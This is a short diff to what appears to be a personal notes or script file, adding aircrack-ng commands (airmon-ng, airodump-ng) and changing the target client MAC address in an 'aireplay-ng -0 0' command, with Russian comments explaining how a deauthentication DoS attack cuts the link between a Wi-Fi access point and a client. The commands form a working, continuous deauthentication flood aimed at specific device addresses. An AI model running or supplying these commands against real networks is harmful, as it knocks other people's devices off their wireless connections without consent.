@@ -1,4 +1,7 @@
-aireplay-ng -0 0 -a 50:ff:20:6a:e5:a8 -c 0e:98:ab:74:cf:a0 wlan1
+airmon-ng check kill
+systemctl start NetworkManager
+airodump-ng wlan1
+aireplay-ng -0 0 -a 50:ff:20:6a:e5:a8 -c c4:3a:be:71:22:7b wlan1
 #Aireplay-ng во время выполнения DoS атаки кадрами деаутентификации
 #посылает эти кадры клиенту от лица точки доступа и точке доступа от лица
 #клиента. Таким образом, оба устройства считают, что связь была прервана с
